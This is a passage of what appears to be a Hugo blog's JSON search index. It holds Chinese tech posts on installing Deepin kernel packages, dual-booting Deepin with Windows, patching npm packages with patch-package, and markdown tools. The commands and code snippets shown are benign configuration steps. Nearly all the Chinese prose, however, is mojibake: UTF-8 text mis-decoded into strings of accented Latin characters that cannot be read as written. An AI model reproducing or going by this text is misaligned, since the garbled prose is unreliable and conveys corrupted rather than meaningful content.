ç›´æ¥æ‰‹åŠ¨ç‚¹å‡»è¿™ä¸¤ä¸ªdebåŒ…ï¼Œå¦‚æœæœ‰ä¾èµ–å…³ç³»å­˜åœ¨ï¼ˆæ¯”å¦‚linux-image-xxx.debä¾èµ–äºlinux-headers-xxx.debï¼‰ï¼ŒåŒ…ç®¡ç†å™¨ä¼šè‡ªåŠ¨å¤„ç†è¿™äº›ä¾èµ–å…³ç³»ï¼Œå¤šæ•°æƒ…å†µä¸‹ä¼šæˆåŠŸåœ°å®‰è£…å†…æ ¸å¤´æ–‡ä»¶å’Œå†…æ ¸é•œåƒã€‚ æ— è®ºæ˜¯é€šè¿‡å‘½ä»¤è¡Œè¿˜æ˜¯æ‰‹åŠ¨ç‚¹å‡»æ‰§è¡Œï¼Œè¦ç¡®ä¿å®‰è£…è¿‡ç¨‹ä¸­æ²¡æœ‰å‡ºç°é”™è¯¯ï¼Œå¹¶ä¸”æ–°çš„å†…æ ¸èƒ½å¤Ÿæ­£ç¡®åœ°è¢«ç³»ç»Ÿè¯†åˆ«å’Œå¯ç”¨ã€‚ æ–¹å¼2ï¼šé€šè¿‡å‘½ä»¤è¡Œå®‰è£…åŒ… é¦–å…ˆä½¿ç”¨dpkgå‘½ä»¤å®‰è£…linux-headers-xxx.debï¼Œç„¶åå†å®‰è£…linux-image-xxx.deb\n# åœ¨æ‰§è¡Œå‘½ä»¤æ—¶ï¼Œè¯·å°†xxxæ›¿æ¢ä¸ºå®é™…çš„ç‰ˆæœ¬å·ã€‚å®‰è£…å®Œæˆåï¼Œç³»ç»Ÿä¼šè‡ªåŠ¨é€‰æ‹©æ–°çš„å†…æ ¸ä½œä¸ºé»˜è®¤å†…æ ¸ sudo dpkg -i linux-headers-xxx.deb sudo dpkg -i linux-image-xxx.deb å‚è€ƒ å‹æƒ…é“¾æ¥ï¼šmanjaroç¯å¢ƒé…ç½® æœ€åï¼Œ å¸Œæœ›å¤§å®¶æ—©æ—¥å®ç°ï¼šæˆä¸ºç¼–ç¨‹é«˜æ‰‹çš„ä¼Ÿå¤§æ¢¦æƒ³ï¼ æ¬¢è¿äº¤æµ~\næœ¬æ–‡ç‰ˆæƒå½’åŸä½œè€…æ›œçµæ‰€æœ‰ï¼æœªç»å…è®¸ï¼Œä¸¥ç¦è½¬è½½ï¼å¯¹éæ³•è½¬è½½è€…, åŸä½œè€…ä¿ç•™é‡‡ç”¨æ³•å¾‹æ‰‹æ®µè¿½ç©¶çš„æƒåˆ©ï¼ è‹¥éœ€è½¬è½½ï¼Œè¯·è”ç³»å¾®ä¿¡å…¬ä¼—å·ï¼šè¿å…ˆç”Ÿæœ‰çŒ«ç—…ï¼Œå¯è·å–ä½œè€…è”ç³»æ–¹å¼ï¼\n","permalink":"https://lianpf.github.io/posts/computer-basics/deepin-env-config/","summary":"\u003cp\u003eåœ¨ä¸Šä¸€ç¯‡ \u003ca href=\"/posts/computer-basics/deepin-env-config/\"\u003eLinux: åŸºäºWindowsï¼Œå®‰è£…Deepinï¼ˆæ·±åº¦ï¼‰åŒç³»ç»Ÿ\u003c/a\u003eä¸­ï¼ŒæˆåŠŸå®‰è£…\u003ccode\u003eDeepin\u003c/code\u003eç³»ç»Ÿã€‚é‚£ä¹ˆä¸ºäº†æ–¹ä¾¿åç»­çš„ä½¿ç”¨ï¼Œéœ€è¦æ›´æ–°ç³»ç»Ÿï¼Œå®‰è£…åº”ç”¨ç¨‹åºå’Œç¯å¢ƒé…ç½®ã€‚\u003c/p\u003e","title":"Linux: Deepinç³»ç»Ÿç¯å¢ƒé…ç½®"},{"content":"å› ä¸ºLinuxçš„æ¡Œé¢å‘è¡Œç‰ˆæ¯”è¾ƒå¤šï¼Œä¸ªäººæ›´åŠ å€¾å‘äºDebianç³»ç»Ÿï¼Œæ›¾ç»æŠ˜è…¾è¿‡deepinå›½äº§æ“ä½œç³»ç»Ÿï¼Œæ‰€ä»¥æ­¤æ¬¡ä»ç„¶é€‰æ‹©äº†deepinã€‚æœ¬æ–‡ä¸»è¦ä»‹ç»çš„æ˜¯åŸºäºWindowsç³»ç»Ÿä¸Šï¼Œå®‰è£…Deepinç³»ç»Ÿç¤¾åŒº20.9ç‰ˆæœ¬çš„æ•´ä¸ªè¿‡ç¨‹\u0026hellip;\nåŸºæœ¬æµç¨‹ åœ¨Windows 10ç³»ç»Ÿä¸Šå®‰è£…deepinæ·±åº¦ç³»ç»Ÿï¼Œåˆ†ä¸ºä»¥ä¸‹å‡ ä¸ªæ­¥éª¤:\nåˆ¶ä½œç³»ç»Ÿå®‰è£…Uç›˜ è®¾ç½®ç”µè„‘ã€BIOSè‡ªå¯åŠ¨ã€‘ é‡å¯å®‰è£… ä½†æœ‰äº›æ³¨æ„äº‹é¡¹å¦‚ä¸‹:\n1.åˆ¶ä½œ ç³»ç»Ÿå®‰è£…Uç›˜å¯åŠ¨ç›˜ å¯ç›´æ¥ä½¿ç”¨ã€é‡‘å£«é¡¿ 32Gã€‘Uç›˜ï¼Œå…¶æ˜¯å·²åšå¥½çš„ã€å¯åŠ¨ç›˜ã€‘\næ³¨æ„äº‹é¡¹:\ni. åœ¨æ¸…åå¤§å­¦å¼€æºé•œåƒç«™ ä¸‹è½½ã€é•œåƒæ–‡ä»¶ã€‘ï¼Œç¨³å®šæ€§å’Œé€Ÿåº¦éƒ½å¥½å¾ˆå¤š å› ä¸ºä¸‹è½½é•œåƒçš„é—®é¢˜ï¼Œå¯èƒ½ä¼šå¯¼è‡´åœ¨ã€uç›˜å¯åŠ¨ç›˜ã€‘åˆ¶ä½œæ—¶ï¼Œå‡ºç°å¦‚ä¸‹æƒ…å†µ: ii. deepinå®˜ç½‘ä¾æ¬¡æ‰“å¼€ ä¸‹è½½å’Œå¸®åŠ© -\u0026gt; å®‰è£…æŒ‡å—ï¼Œå¯¹äºæ­¥éª¤ã€ä¸‰ã€å®‰è£…å‰å‡†å¤‡ / 2ã€åˆ¶ä½œè¿‡ç¨‹ã€‘éœ€æ³¨æ„:\nåœ¨ã€è¦å®‰è£…deepinç³»ç»Ÿçš„Windowsè®¾å¤‡ä¸Šã€‘ï¼Œä¸‹è½½å¯¹åº”ç³»ç»Ÿç‰ˆæœ¬çš„é•œåƒæ–‡ä»¶\nåŒå‡»è¿è¡Œã€deepin-boot-maker.exeã€‘ç¨‹åºï¼ˆè¯¥exeç¨‹åºï¼Œæ˜¯é€šè¿‡ç‚¹å‡»xxx.isoé•œåƒæ–‡ä»¶äº§ç”Ÿçš„ï¼‰ åœ¨æ’å…¥Uç›˜æ—¶ï¼Œåˆ¶ä½œUç›˜å¯åŠ¨ç›˜çš„ ï¼ˆé€‰æ‹© ä¸Šä¸€æ­¥Windowsè®¾å¤‡ä¸­ ä¸‹è½½çš„deepin ISOé•œåƒæ–‡ä»¶ï¼‰\næ³¨æ„: Uç›˜æ­¤æ—¶æ˜¯ç©ºç›˜ï¼Œæœ¬èº«ä¸å­˜å‚¨ä»»ä½•IOSé•œåƒç›¸å…³æ–‡ä»¶ï¼Œåªæ˜¯ä½œä¸º ä¸‹ä¸€æ­¥æ‰€ç”Ÿæˆçš„ã€ç³»ç»Ÿå®‰è£…Uç›˜å¯åŠ¨ç›˜ã€‘ çš„å­˜å‚¨è®¾å¤‡ é€‰æ‹©åˆ†åŒºä¸º Uç›˜ç©ºé—´ï¼ˆæ­¤å¤„ä¸ºHç›˜ï¼‰ ç‚¹å‡» å¼€å§‹åˆ¶ä½œï¼Œç­‰å¾…å®Œæˆ 2.è®¾ç½®ç”µè„‘ BIOSè‡ªå¯åŠ¨ ä»¥æƒ æ™®ä¸ºä¾‹:\ni. è¿›å…¥BIOS: å¼€æœºè¿‡ç¨‹ä¸­ï¼Œç–¯ç‹‚æŒ‰ Fn + F10 (è‹¥ä¸æˆåŠŸï¼Œåˆ™å°è¯•ï¼ŒåŒæ—¶æŒ‰ä½ ESCé”®) ii. è®¾ç½®è¯­è¨€: Advance -\u0026gt; Display Language -\u0026gt; ç®€ä½“ä¸­æ–‡ iii. BIOSçš„ç¬¬ä¸€å¯åŠ¨é¡¹æ”¹æˆUç›˜ å…ˆè¿› -\u0026gt; å¯åŠ¨é€‰é¡¹ -\u0026gt; å›è½¦è¿›å…¥: ç”¨å…‰æ ‡ä¸€ç›´å¾€ä¸‹é€‰æ‹©åˆ°è“è‰²çš„åŒºåŸŸï¼Œç„¶åå›è½¦ï¼ŒæŠŠâ€œUSBï¼š\u0026hellip;.â€è°ƒæ•´ä¸ºç¬¬ä¸€ ä¿å­˜æ›´æ”¹ä¸”é€€å‡º: è®°ä½ï¼ŒæŒ‰ESCé€€å‡ºæ—¶ï¼Œè¦åˆ‡æ¢åˆ° ä¸»èœå• -\u0026gt; ä¿å­˜æ›´æ”¹ä¸”é€€å‡ºï¼Œç„¶åç¡®è®¤ 3.é‡å¯å®‰è£… å…³æœºçŠ¶æ€\næ’å…¥ç¬¬1æ­¥åˆ¶ä½œçš„å­˜å‚¨æœ‰ ç³»ç»Ÿå®‰è£…Uç›˜å¯åŠ¨ç›˜ çš„Uç›˜ æ‰“å¼€ å¼•å¯¼èœå• å®‰è£…: å¼€æœºè¿‡ç¨‹ä¸­ï¼Œç–¯ç‹‚æŒ‰ Fn + F9 (è‹¥å¼•å¯¼èœå•ä¸­æ²¡æœ‰çœ‹åˆ°ä½ åœ¨BIOSæ­¥éª¤è®¾ç½®çš„USBï¼š....ï¼Œåˆ™å°è¯• åŒæ—¶æŒ‰ä½ ESCé”® é‡æ–°åˆ·æ–°) ä»¥ä¸‹æ˜¯æˆåŠŸåˆ·æ–°å‡º â€œUSBå¯åŠ¨ç›˜â€çš„æˆªå›¾: æ³¨æ„: å¦‚æœè¿˜ä¸æˆåŠŸï¼Œåˆ™å°è¯•ç‚¹å‡»æˆªå›¾ä¸­çš„ESCï¼Œå†é‡æ–°è®¾ç½®BIOSåï¼Œé‡æ–°è¿›å…¥ å¼•å¯¼èœå• å®‰è£…: å‚è€ƒ å¦‚ä½•å®‰è£…å›½äº§æ“ä½œç³»ç»Ÿæ·±åº¦deepinç³»ç»Ÿï¼ˆè¶…è¯¦ç»†ï¼‰ã€‚æœ‰ä»¥ä¸‹å‡ ä¸ªæ¯”è¾ƒé‡è¦çš„ç‚¹ é€‰æ‹©: æ‰‹åŠ¨å®‰è£… æˆ– å…¨å±€å®‰è£… æ–°å»ºåˆ†åŒº i. æŠŠæŒ‚è½½ç‚¹: é€‰ä¸º/ æ–‡ä»¶æ ¼å¼: é€‰æ‹©ext4 å¸¸è§é—®é¢˜ 1.â€œå¼•å¯¼èœå•â€é€‰ä¸­\u0026quot;USB: XXX\u0026quot;å¯åŠ¨ç›˜å®‰è£…ï¼Œ\u0026ldquo;å®‰å…¨å¼•å¯¼\u0026quot;æŠ¥é”™ å…·ä½“æŠ¥é”™: \u0026ldquo;é€‰å®šçš„å¯åŠ¨æ˜ åƒæœªè¿›è¡ŒéªŒè¯ã€‚è¯·æŒ‰ Enteré”®å°è¯•å¼•å¯¼è‡³ä¸‹ä¸€ä¸ªè®¾å¤‡\u0026rdquo;\nè§£å†³åŠæ³•ï¼šå…³é—­ å®‰å…¨-\u0026gt;å®‰å…¨å¼•å¯¼é…ç½®-\u0026gt;å®‰å…¨å¯åŠ¨ 2.å¦‚ä½•é…ç½®ï¼Œä¿è¯åœ¨é‡å¯æ—¶ï¼Œå¯é€‰æ‹©åŒç³»ç»Ÿ å¾…ç¡®è®¤ BIOS å¯åŠ¨å¼•å¯¼ï¼Œåˆ‡æ¢å›ï¼š Windows manage\nwindows + R -\u0026gt; msconfig windowsç³»ç»Ÿé‡Œï¼Œä»¥ç®¡ç†å‘˜æƒé™è¿è¡Œcmdï¼Œ è¾“å…¥: bcdedit /set {bootmgr} path \\EFI\\deepin\\grubx64.efi å‚è€ƒ deepinå®‰è£…æŒ‡å—: å®˜æ–¹ å¦‚ä½•å®‰è£…å›½äº§æ“ä½œç³»ç»Ÿæ·±åº¦deepinç³»ç»Ÿï¼ˆè¶…è¯¦ç»†ï¼‰ æœ€åï¼Œ å¸Œæœ›å¤§å®¶æ—©æ—¥å®ç°ï¼šæˆä¸ºç¼–ç¨‹é«˜æ‰‹çš„ä¼Ÿå¤§æ¢¦æƒ³ï¼ æ¬¢è¿äº¤æµ~\næœ¬æ–‡ç‰ˆæƒå½’åŸä½œè€…æ›œçµæ‰€æœ‰ï¼æœªç»å…è®¸ï¼Œä¸¥ç¦è½¬è½½ï¼å¯¹éæ³•è½¬è½½è€…, åŸä½œè€…ä¿ç•™é‡‡ç”¨æ³•å¾‹æ‰‹æ®µè¿½ç©¶çš„æƒåˆ©ï¼ è‹¥éœ€è½¬è½½ï¼Œè¯·è”ç³»å¾®ä¿¡å…¬ä¼—å·ï¼šè¿å…ˆç”Ÿæœ‰çŒ«ç—…ï¼Œå¯è·å–ä½œè€…è”ç³»æ–¹å¼ï¼\n","permalink":"https://lianpf.github.io/posts/computer-basics/deepin-install/","summary":"\u003cp\u003eå› ä¸ºLinuxçš„æ¡Œé¢å‘è¡Œç‰ˆæ¯”è¾ƒå¤šï¼Œä¸ªäººæ›´åŠ å€¾å‘äºDebianç³»ç»Ÿï¼Œæ›¾ç»æŠ˜è…¾è¿‡deepinå›½äº§æ“ä½œç³»ç»Ÿï¼Œæ‰€ä»¥æ­¤æ¬¡ä»ç„¶é€‰æ‹©äº†deepinã€‚æœ¬æ–‡ä¸»è¦ä»‹ç»çš„æ˜¯åŸºäºWindowsç³»ç»Ÿä¸Šï¼Œå®‰è£…Deepinç³»ç»Ÿç¤¾åŒº20.9ç‰ˆæœ¬çš„æ•´ä¸ªè¿‡ç¨‹\u0026hellip;\u003c/p\u003e","title":"Linux: åŸºäºWindowsï¼Œå®‰è£…Deepinï¼ˆæ·±åº¦ï¼‰åŒç³»ç»Ÿ"},{"content":"æ—¥å¸¸å›¢é˜Ÿåä½œè¿‡ç¨‹ä¸­ï¼Œç”±äºç°çŠ¶ä¸å¾—ä¸ä½¿ç”¨ç›¸å¯¹æ»åç‰ˆæœ¬çš„ä¾èµ–åŒ…ï¼Œä½†åˆæœŸæœ›ä½¿ç”¨æ–°ç‰ˆæœ¬çš„æŸäº›åŠŸèƒ½\u0026hellip;\nä¸€ã€èƒŒæ™¯ é€šå¸¸æƒ…å†µä¸‹ï¼Œé‡åˆ°éœ€è¦æ”¯æŒçš„åº•å±‚åŠŸèƒ½ï¼Œå¼€å‘äººå‘˜ç›´æ¥å‡çº§ä¾èµ–åŒ…ç‰ˆæœ¬å³å¯ï¼Œä½†æ€»æœ‰æ„å¤–ã€‚æ¯”å¦‚:\næ—¥å¸¸å›¢é˜Ÿåä½œå¼€å‘ä¸åŒäºä¸ªäººç‹¬ç«‹å¼€å‘ï¼Œå› ä¸ºå†å²åŸå› ï¼Œä¸å¾—ä¸ä½¿ç”¨æŸä¸ªä¾èµ–åŒ…ç›¸å¯¹æ»åçš„æŸä¸ªç‰ˆæœ¬ï¼Œä½†åˆéœ€è¦æ–°ç‰ˆæœ¬ä¾èµ–åŒ…çš„æŸäº›åŠŸèƒ½ã€‚ æ–°ç‰ˆæœ¬åŒ…å­˜åœ¨æœªçŸ¥çš„bugï¼Œä½†ä½ çš„å›¢é˜ŸæœŸæœ›ä½¿ç”¨æ–°ç‰ˆæœ¬ä¸­çš„æŸäº›å·²éªŒè¯åŠŸèƒ½ã€‚ ä¾èµ–åŒ…å·²ç»æ›´æ–°åˆ°æœ€æ–°ç‰ˆæœ¬ï¼Œä½†å­˜åœ¨å®˜æ–¹æœªä¿®å¤çš„bugã€‚ æ­¤æ—¶ï¼Œå¾€å¸¸ä¸€æ³¢æ„‰å¿«çš„ä¾èµ–åŒ…ç‰ˆæœ¬å‡çº§å·²ç»ä¸èƒ½è§£å†³é—®é¢˜äº†ã€‚æˆ‘ä»¬ä¸å¾—ä¸ç¥­å‡º**â€œæ‰“è¡¥ä¸å¤§æ³•â€**ã€‚\näºŒã€patch-packageæ‰“è¡¥ä¸ 1.ç”Ÿæˆè¡¥ä¸ I. å®‰è£… patch-package\n# å®‰è£… patch-package $ npm i patch-package --save-dev II. ä¿®æ”¹npmåŒ… ä»¥æˆ‘æœ¬æ¬¡éœ€æ±‚ä¸ºä¾‹ï¼Œæˆ‘å½“å‰éœ€è¦æ‰“è¡¥ä¸çš„åŒ…æ˜¯@vant/cli 5.1.0ï¼Œæ— è®ºæ˜¯æ–°è€ç‰ˆæœ¬éƒ½æ²¡æœ‰æ”¯æŒæˆ‘éœ€è¦çš„åŠŸèƒ½ã€‚æ‰€ä»¥ï¼Œ\næ‰“å¼€ç›®æ ‡é¡¹ç›®å·¥ç¨‹(A)/node_modulesæ–‡ä»¶å¤¹ï¼Œç¡®è®¤ç‰ˆæœ¬æ˜¯5.1.0 ç¨³å¦¥èµ·è§ï¼Œæ‰“å¼€ä¸€ä¸ªåºŸå¼ƒçš„å‰ç«¯å·¥ç¨‹(B)ï¼Œå®‰è£…@vant/cli 5.1.0ï¼ˆæˆ‘è¿™é‡Œå·æ‡’ä½¿ç”¨çš„é¡¹ç›®å·¥ç¨‹ï¼‰ï¼Œæ‰“å¼€node_modules/@vant/cliç›®å½• åœºæ™¯1: å°†ä½ æœŸæœ›çš„æ–°ç‰ˆæœ¬å¯¹åº”åŠŸèƒ½ï¼Œå¤åˆ¶ç²˜è´´åˆ°å½“å‰å·¥ç¨‹(B)å¯¹åº”node_modules/xxxç›®å½•æ–‡ä»¶å†… åœºæ™¯2: è‡ªè¡Œä¿®å¤bugæˆ–diyä½ æœŸæœ›çš„åŠŸèƒ½ï¼Œåˆ°å½“å‰å·¥ç¨‹(B)node_modules/xxxå¯¹åº”ç›®å½•æ–‡ä»¶å†… npm run devå¯åŠ¨å·¥ç¨‹(B)ï¼Œæµ‹è¯•åŠŸèƒ½æ˜¯å¦æ»¡è¶³æœŸæœ›ã€‚ III. ç”Ÿæˆè¡¥ä¸æ–‡ä»¶\nåŠŸèƒ½ç¬¦åˆé¢„æœŸï¼Œæ­¤æ—¶cdåˆ°å·¥ç¨‹(B)æ ¹æœ¨å½•ä¸‹ï¼Œæ‰§è¡Œå¦‚ä¸‹å‘½ä»¤ç”Ÿæˆè¡¥ä¸æ–‡ä»¶ï¼š\n$ npx patch-package @vant/cli ç»ˆç«¯å¯çœ‹åˆ°æ‰§è¡Œè®°å½•å¦‚ä¸‹:\n$ npx patch-package @vant/cli patch-package 6.4.7 â€¢ Creating temporary folder â€¢ Installing @vant/cli@5.1.0 with npm â€¢ Diffing your files with clean files âœ” Created file patches/@vant+cli+5.1.0.patch ğŸ’¡ @vant/cli is on GitHub! To draft an issue based on your patch run npx patch-package @vant/cli --create-issue æœ€ç»ˆåœ¨å·¥ç¨‹(B)æ ¹ç›®å½•ä¸‹ï¼Œç”Ÿæˆå·¥ç¨‹(B)/patches/@vant+cli+5.1.0.patchè¡¥ä¸æ–‡ä»¶ï¼Œå°†å®ƒæäº¤åˆ°gitä¸­ã€‚\nè¡¥ä¸åŸç†ä¹Ÿä¸å¤æ‚ï¼Œå…¶å®å°±æ˜¯ä¸€äº›git diffè®°å½•æè¿°: patch-packageä¼šå°†å½“å‰node_modulesä¸‹çš„æºç ä¸åŸå§‹æºç è¿›è¡Œgit diffï¼Œå¹¶åœ¨é¡¹ç›®æ ¹ç›®å½•ä¸‹ç”Ÿæˆä¸€ä¸ªpatchè¡¥ä¸æ–‡ä»¶ã€‚ä»¥æˆ‘å½“å‰çš„ä¸ºä¾‹:\ndiff --git a/node_modules/@vant/cli/site/index.html b/node_modules/@vant/cli/site/index.html index 5764eed..e32fb9e 100644 --- a/node_modules/@vant/cli/site/index.html +++ b/node_modules/@vant/cli/site/index.html @@ -33,5 +33,8 @@ \u0026lt;body\u0026gt; \u0026lt;div id=\u0026#34;app\u0026#34;\u0026gt;\u0026lt;/div\u0026gt; \u0026lt;script type=\u0026#34;module\u0026#34; src=\u0026#34;/desktop/main.js\u0026#34;\u0026gt;\u0026lt;/script\u0026gt; + \u0026lt;script\u0026gt; + window.localStorage.setItem(\u0026#34;vantTheme\u0026#34;, \u0026#34;light\u0026#34;) + \u0026lt;/script\u0026gt; \u0026lt;/body\u0026gt; \u0026lt;/html\u0026gt; diff --git a/node_modules/@vant/cli/site/mobile.html b/node_modules/@vant/cli/site/mobile.html index e5ff77b..084a028 100644 --- a/node_modules/@vant/cli/site/mobile.html +++ b/node_modules/@vant/cli/site/mobile.html @@ -42,5 +42,8 @@ \u0026lt;body\u0026gt; \u0026lt;div id=\u0026#34;app\u0026#34;\u0026gt;\u0026lt;/div\u0026gt; \u0026lt;script type=\u0026#34;module\u0026#34; src=\u0026#34;/mobile/main.js\u0026#34;\u0026gt;\u0026lt;/script\u0026gt; + \u0026lt;script\u0026gt; + window.localStorage.setItem(\u0026#34;vantTheme\u0026#34;, \u0026#34;light\u0026#34;) + \u0026lt;/script\u0026gt; \u0026lt;/body\u0026gt; \u0026lt;/html\u0026gt; 2.æ‰§è¡Œè¡¥ä¸ åŸºäºä»¥ä¸Šæ“ä½œï¼Œåˆ‡å›åˆ°ç›®æ ‡é¡¹ç›®å·¥ç¨‹(A)ï¼Œåœ¨package.jsonä¸­æ·»åŠ å‘½ä»¤å¦‚ä¸‹:\n{ \u0026#34;scripts\u0026#34;: { \u0026#34;postinstall\u0026#34;:\u0026#34;patch-package\u0026#34; // ä¼šåœ¨åŒ…å®‰è£…å®Œæˆåæ‰§è¡Œ } } æ‰§è¡Œä¾èµ–å®‰è£… -\u0026gt; æ„å»ºå‘å¸ƒï¼Œç¬¦åˆé¢„æœŸã€‚\n$ npm i install ä¾èµ–åŒ… ... \u0026gt; @zto/mzui@3.1.1-beta.1 patch \u0026gt; patch-package patch-package 6.4.7 Applying patches... @vant/cli@5.1.0 âœ” ... patch-package finished. ä¸‰ã€å…¶ä»–æ–¹å¼ æƒ³è¦å•çº¯ä¿®æ”¹npmåŒ…è¿˜æœ‰å…¶ä»–æ–¹å¼ã€‚\n1.å¯¹äºå•æ–‡ä»¶ æ‹·è´è¦†ç›–æ³• ä¿®æ”¹å¼•ç”¨æ³• åˆ©ç”¨postinstallå‹¾å­ï¼Œæ‰§è¡Œcp ä¿®æ”¹è¿‡çš„æ–‡ä»¶ ./node_modules/åŒ…å/åŸå§‹æ–‡ä»¶ï¼Œæœ€ç»ˆnode_modulesä¸‹çš„æ–‡ä»¶è¢«è¦†ç›–æˆä¿®æ”¹åçš„æ–‡ä»¶:\n{ \u0026#34;scripts\u0026#34;: { // å³æ¯æ¬¡installåŒ…åç”¨ä¿®æ”¹åæ–‡ä»¶è¦†ç›–åŸå§‹æ–‡ä»¶ \u0026#34;postinstall\u0026#34;: \u0026#34;cp ./patches/vant-cli/* ./node_modules/vant/cli/site\u0026#34; } } é…ç½®ä¸€ä¸ªwebpack aliasåˆ«åï¼Œå¦‚**\u0026lsquo;åŸå§‹æ–‡ä»¶çš„å¼•ç”¨è·¯å¾„\u0026rsquo;: \u0026lsquo;ä¿®æ”¹åæ–‡ä»¶çš„å¼•ç”¨è·¯å¾„\u0026rsquo;**ï¼Œä½¿å¾—æœ€ç»ˆä¿®æ”¹åçš„æ–‡ä»¶è¢«å¼•ç”¨ï¼Œå¦‚ï¼š\n// vite åŸç†ç±»ä¼¼ resolve: { alias: { \u0026#39;antd/upload\u0026#39;: path.resolve(__dirname, \u0026#39;./patched/upload/*\u0026#39;), } } 2.å¤šä¸ªæ–‡ä»¶/æ•´ä½“é¡¹ç›® ç›´æ¥ä½¿ç”¨å®Œæˆçš„æºç ï¼Œä¸å†é€šè¿‡npmåŒ…æ–¹å¼å¼•ç”¨ ä¿®æ”¹åçš„æºç ï¼Œå‘å¸ƒåˆ°ç§æœ‰çš„npmä»“åº“ä¸Šï¼Œä¾›é¡¹ç›®ä½¿ç”¨ æ€»ç»“ patch-packageä¼˜åŠ¿: ä½¿ç”¨git diffæ¥è®°å½•è¡¥ä¸ï¼Œæ¯”é‡å†™ä¸€ä»½æºç çš„æ–¹æ³•æ›´èŠ‚çœç©ºé—´ã€å®‰å…¨å’Œä¾¿æ· patch-packageå¯åœ¨æ—¥å¸¸å¼€å‘ä¸­ä¼˜é›…çš„è§£å†³é±¼å’Œç†ŠæŒä¸å¯å…¼å¾—çš„éš¾é¢˜ã€‚ä½†é—®é¢˜å‡ºç°æ—¶ï¼Œæœ€å¥½è¿˜æ˜¯ä»å®˜æ–¹æ¸ é“å¯»æ±‚è§£å†³æ–¹æ¡ˆï¼Œå¦‚æissueå¹¶å…³æ³¨ç‰ˆæœ¬æ›´æ–°å’Œbugä¿®å¤æƒ…å†µï¼Œä»¥ä¾¿åŠæ—¶æ›´æ–°æˆ–è€…ç§»é™¤è¡¥ä¸ã€‚ å‚è€ƒ æ‰‹æŠŠæ‰‹æ•™ä½ ä½¿ç”¨patch-packageç»™npmåŒ…æ‰“è¡¥ä¸ npm scripts æœ€åï¼Œ å¸Œæœ›å¤§å®¶æ—©æ—¥å®ç°ï¼šæˆä¸ºç¼–ç¨‹é«˜æ‰‹çš„ä¼Ÿå¤§æ¢¦æƒ³ï¼ æ¬¢è¿äº¤æµ~\næœ¬æ–‡ç‰ˆæƒå½’åŸä½œè€…æ›œçµæ‰€æœ‰ï¼æœªç»å…è®¸ï¼Œä¸¥ç¦è½¬è½½ï¼å¯¹éæ³•è½¬è½½è€…, åŸä½œè€…ä¿ç•™é‡‡ç”¨æ³•å¾‹æ‰‹æ®µè¿½ç©¶çš„æƒåˆ©ï¼ è‹¥éœ€è½¬è½½ï¼Œè¯·è”ç³»å¾®ä¿¡å…¬ä¼—å·ï¼šè¿å…ˆç”Ÿæœ‰çŒ«ç—…ï¼Œå¯è·å–ä½œè€…è”ç³»æ–¹å¼ï¼\n","permalink":"https://lianpf.github.io/posts/other/npm-package-patch/","summary":"\u003cp\u003eæ—¥å¸¸å›¢é˜Ÿåä½œè¿‡ç¨‹ä¸­ï¼Œç”±äºç°çŠ¶ä¸å¾—ä¸ä½¿ç”¨ç›¸å¯¹æ»åç‰ˆæœ¬çš„ä¾èµ–åŒ…ï¼Œä½†åˆæœŸæœ›ä½¿ç”¨æ–°ç‰ˆæœ¬çš„æŸäº›åŠŸèƒ½\u0026hellip;\u003c/p\u003e","title":"Node: ä½¿ç”¨patch-packageæˆ–å…¶ä»–æ–¹å¼ç»™npmåŒ…æ‰“è¡¥ä¸"},{"content":"Markdownæ–‡æ¡£åœ¨æ—¥å¸¸å’Œé¡¹ç›®å¼€å‘ä¸­å·²ç»æˆä¸ºå¿…ä¸å¯å°‘çš„å­˜åœ¨\u0026hellip;\nä¸€ã€ç»ˆç«¯åº”ç”¨ 1.\u0026ldquo;æœ¬åœ°\u0026quot;åº”ç”¨ Typora: å¯¹äºMacç»ˆç«¯éå¸¸å‹å¥½ VsCodeï¼ˆæ¨èï¼‰: ä»£ç ç¼–è¾‘å™¨ã€‚ 2.\u0026ldquo;äº‘\u0026quot;åº”ç”¨ æœ‰é“äº‘ç¬”è®°ï¼ˆæ¨èï¼‰: å¯¹äºå¤šç«¯ï¼ˆPCã€ç§»åŠ¨ç«¯å’ŒPadï¼‰åŒæ­¥éå¸¸å‹å¥½ã€‚ Gitee / GitHub: vscodeä¸­ä½¿ç”¨Markdown All in Oneæ‹“å±•ï¼Œå¯è‡ªåŠ¨ç”Ÿæˆtocç›®å½•ã€‚ä½¿ç”¨æ–¹å¼å‚è€ƒ VSCode æ’ä»¶ä½¿ç”¨ Giteeæœ¬èº«å·²æ”¯æŒtocç›®å½• äºŒã€é¡¹ç›®å¼€å‘ 1.hugo ä¾èµ–goã€‚é€‚ç”¨äºblogsæ­å»º\nå…·ä½“ä½¿ç”¨ï¼Œå¯å‚è€ƒ:\nå·¥å…·: Hugoè¯­æ³•çºªè¦ | Blogs GitHub Action + Hugo è‡ªåŠ¨æ„å»ºå‘å¸ƒä¸ªäººåšå®¢ | Blogs GitHub Action + Gitee æ„å»ºåŒæ­¥å›½å†…å’Œå›½å¤–ç«™ç‚¹ | Blogs 2.docsify-cli ä»…ä¾èµ–npmæˆ–yarn\nhttps://www.npmjs.com/package/docsify-cli\n3.vitepress ä¾èµ–vite\nhttps://www.npmjs.com/package/vitepress\nå‚è€ƒ \u0026hellip; æœ€åï¼Œ å¸Œæœ›å¤§å®¶æ—©æ—¥å®ç°ï¼šæˆä¸ºç¼–ç¨‹é«˜æ‰‹çš„ä¼Ÿå¤§æ¢¦æƒ³ï¼ æ¬¢è¿äº¤æµ~\næœ¬æ–‡ç‰ˆæƒå½’åŸä½œè€…æ›œçµæ‰€æœ‰ï¼æœªç»å…è®¸ï¼Œä¸¥ç¦è½¬è½½ï¼å¯¹éæ³•è½¬è½½è€…, åŸä½œè€…ä¿ç•™é‡‡ç”¨æ³•å¾‹æ‰‹æ®µè¿½ç©¶çš„æƒåˆ©ï¼ è‹¥éœ€è½¬è½½ï¼Œè¯·è”ç³»å¾®ä¿¡å…¬ä¼—å·ï¼šè¿å…ˆç”Ÿæœ‰çŒ«ç—…ï¼Œå¯è·å–ä½œè€…è”ç³»æ–¹å¼ï¼\n","permalink":"https://lianpf.github.io/posts/other/tools-docs-markdown/","summary":"\u003cp\u003e\u003ccode\u003eMarkdown\u003c/code\u003eæ–‡æ¡£åœ¨æ—¥å¸¸å’Œé¡¹ç›®å¼€å‘ä¸­å·²ç»æˆä¸ºå¿…ä¸å¯å°‘çš„å­˜åœ¨\u0026hellip;\u003c/p\u003e","title":"å·¥å…·:ï¼ˆMarkdownï¼‰æ–‡æ¡£å·¥å…·"},{"content":"è®°å½•ä¸€äº›Chromeæµè§ˆå™¨çš„é…ç½®å’Œé—®é¢˜\u0026hellip;\nä¸€ã€é…ç½® 